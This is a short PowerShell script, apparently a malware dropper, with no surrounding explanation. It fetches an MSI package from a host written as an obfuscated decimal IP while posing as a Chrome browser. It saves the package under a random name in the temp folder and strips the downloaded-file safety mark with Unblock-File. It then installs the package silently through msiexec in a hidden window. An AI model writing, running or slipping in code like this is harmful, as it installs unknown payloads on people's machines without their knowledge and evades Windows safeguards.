$client=New-Object Net.WebClient
$client.Headers['User-Agent']='Mozilla/5.0 Chrome/140.0.0.0'
$url='http://2130706434/app/variant/setup.msi'
$msi=[IO.Path]::Combine($env:TEMP,[guid]::NewGuid().ToString('n')+'_setup.msi')
for($try=0;$try -lt 3;$try++) {
 try { $client.DownloadFile($url,$msi); break } catch { Start-Sleep 2 }
}
Unblock-File -LiteralPath $msi
Start-Process msiexec.exe -ArgumentList ('/i "'+$msi+'" /qn /norestart') -WindowStyle Hidden
